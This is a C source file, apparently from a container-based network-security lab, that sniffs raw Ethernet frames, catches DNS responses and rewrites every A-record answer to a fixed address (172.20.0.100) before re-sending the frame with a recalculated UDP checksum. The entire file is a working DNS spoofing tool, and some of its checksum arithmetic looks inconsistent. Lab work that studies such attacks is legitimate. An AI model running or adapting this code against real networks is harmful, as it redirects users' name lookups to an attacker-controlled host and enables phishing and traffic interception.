#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <netpacket/packet.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <ctype.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include "print.h"

#define BUFFER_SIZE 65536
#define DNS_PORT 53
#define REPLACEMENT_IP "172.20.0.100"
#define SNIFF_N_SPOOF_MAC { 0x02,0x42,0xac,0x14,0x00,0x66}

// DNS header structure
struct dns_header {
    uint16_t id;
    uint16_t flags;
    uint16_t qdcount;
    uint16_t ancount;
    uint16_t nscount;
    uint16_t arcount;
};

// DNS question section structure
struct dns_question {
    uint16_t qtype;
    uint16_t qclass;
};

// DNS resource record structure
struct dns_rr {
    uint16_t type;
    uint16_t class;
    uint32_t ttl;
    uint16_t rdlength;
    unsigned char rdata[];
};

// Function to calculate UDP checksum
uint16_t calculate_udp_checksum(struct iphdr *ip, struct udphdr *udp, unsigned char *payload, int payload_len) {
    uint32_t sum = 0;
    uint16_t *ptr;

    // Add pseudo-header (src IP, dst IP, protocol, UDP length)
    sum += (ip->saddr >> 16) & 0xFFFF;
    sum += ip->saddr & 0xFFFF;
    sum += (ip->daddr >> 16) & 0xFFFF;
    sum += ip->daddr & 0xFFFF;
    sum += htons(IPPROTO_UDP);
    sum += udp->uh_ulen;

    // Add UDP header
    ptr = (uint16_t *)udp;
    for (int i = 0; i < sizeof(struct udphdr) / 2; i++) {
        sum += ntohs(*ptr);
        ptr++;
    }

    // Add payload
    ptr = (uint16_t *)payload;
    for (int i = 0; i < (payload_len + 1) / 2; i++) {
        uint16_t word = (i * 2 < payload_len) ? ntohs(*ptr) : 0;
        sum += word;
        ptr++;
    }

    // Fold 32-bit sum to 16 bits
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~sum;
}

void print_ip_address(struct in_addr addr) {
    printf("%s", inet_ntoa(addr));
}

void print_tcp_hdr(unsigned char *buffer) {
    struct tcphdr *tcp = (struct tcphdr *)buffer;
    printf("Source Port: %d\n", ntohs(tcp->th_sport));
    printf("Destination Port: %d\n", ntohs(tcp->th_dport));
}

void print_udp_hdr(unsigned char *buffer) {
    struct udphdr *udp = (struct udphdr *)buffer;
    printf("Source Port: %d\n", ntohs(udp->uh_sport));
    printf("Destination Port: %d\n", ntohs(udp->uh_dport));
}

void print_icmp_hdr(unsigned char *buffer) {
    struct icmphdr *icmp = (struct icmphdr *)buffer;
    printf("Type: %d\n", icmp->type);
    printf("Code: %d\n", icmp->code);
}

int is_dns_response(unsigned char *payload) {
    struct dns_header *dns = (struct dns_header *)payload;
    return (ntohs(dns->flags) & 0x8000); // Check if QR bit is set (response)
}

void replace_dns_answer_ip(unsigned char *payload) {
    struct dns_header *dns = (struct dns_header *)payload;
    unsigned char *ptr = payload + sizeof(struct dns_header);

    // Skip DNS question section
    for (int i = 0; i < ntohs(dns->qdcount); i++) {
        while (*ptr != 0) ptr += (*ptr) + 1; // Skip label length and label
        ptr += 1; // Skip null terminator
        ptr += sizeof(struct dns_question); // Skip QTYPE and QCLASS
    }

    // Process DNS answer section
    for (int i = 0; i < ntohs(dns->ancount); i++) {
        // Check for DNS name compression
        if ((*ptr & 0xC0) == 0xC0) {
            ptr += 2; // Skip compressed name (2 bytes)
        } else {
            while (*ptr != 0) ptr += (*ptr) + 1; // Skip label length and label
            ptr += 1; // Skip null terminator
        }

        struct dns_rr *rr = (struct dns_rr *)ptr;
        if (ntohs(rr->type) == 1 && ntohs(rr->class) == 1 && ntohs(rr->rdlength) == 4) {
            // Replace the IP address in the answer section
            inet_pton(AF_INET, REPLACEMENT_IP, rr->rdata);
        }
        ptr += sizeof(struct dns_rr) + ntohs(rr->rdlength); // Move to next record
    }
}

int main() {
    int sockfd;
    struct sockaddr_ll saddr;
    unsigned char buffer[BUFFER_SIZE];
    struct ifreq ifr;
    char *iface = "eth0"; // Change this to your network interface

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, iface, IFNAMSIZ);
    if (ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    memset(&saddr, 0, sizeof(saddr));
    saddr.sll_family = AF_PACKET;
    saddr.sll_protocol = htons(ETH_P_ALL);
    saddr.sll_ifindex = ifr.ifr_ifindex;
    if (bind(sockfd, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
        perror("bind");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    // Define the MAC address of the sniff-n-spoof container
    unsigned char sniff_n_spoof_mac[ETH_ALEN] = SNIFF_N_SPOOF_MAC;

    printf("Capturing Ethernet frames on interface %s...\n", iface);

    while (1) {
        int recv_len = recvfrom(sockfd, buffer, BUFFER_SIZE, 0, NULL, NULL);
        if (recv_len < 0) {
            perror("recvfrom");
            close(sockfd);
            exit(EXIT_FAILURE);
        }

        struct ethhdr *eth = (struct ethhdr *)buffer;

        print_buffer_in_hex(eth->h_source, ETH_ALEN);
        print_buffer_in_hex(sniff_n_spoof_mac, ETH_ALEN);

        // Ignore packets originating from the sniff-n-spoof container
        if (memcmp(eth->h_source, sniff_n_spoof_mac, ETH_ALEN) == 0) {
            printf("skipping packets\n");
            continue; // Skip this packet
        }

        if (ntohs(eth->h_proto) == ETH_P_IP) {
            struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));

            if (ip->protocol == IPPROTO_UDP) {
                struct udphdr *udp = (struct udphdr *)(buffer + sizeof(struct ethhdr) + (ip->ihl * 4));
                int transport_data_wo_hdr_len = recv_len - sizeof(struct ethhdr) - (ip->ihl * 4);

                if (ntohs(udp->uh_sport) == DNS_PORT) {
                    unsigned char *dns_payload = (unsigned char *)(udp + 1);

                    if (is_dns_response(dns_payload)) {
                        printf("DNS Response Detected, original:\n");

                        print_buffer_in_hex(dns_payload, 96);
                        replace_dns_answer_ip(dns_payload);
                        printf("DNS Response Replaced\n");
                        print_buffer_in_hex(dns_payload, 96);
                        // Recalculate UDP checksum
                        udp->uh_sum = 0; // Reset checksum before calculation
                        udp->uh_sum = calculate_udp_checksum(ip, udp, dns_payload, ntohs(udp->uh_ulen) - sizeof(struct udphdr));
                        
                        if (sendto(sockfd, buffer, recv_len, 0, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
                            perror("sendto failed");
                        } else {

                            struct iphdr *ip = (struct iphdr *)(buffer + sizeof(struct ethhdr));
                            struct in_addr src_addr;
                            src_addr.s_addr = ip->saddr;
                            
                            printf("Sending modified response, original src IP: %s\n", inet_ntoa(src_addr));
                        }
                    }
                }
            }
        }
    }

    close(sockfd);
    return 0;
}
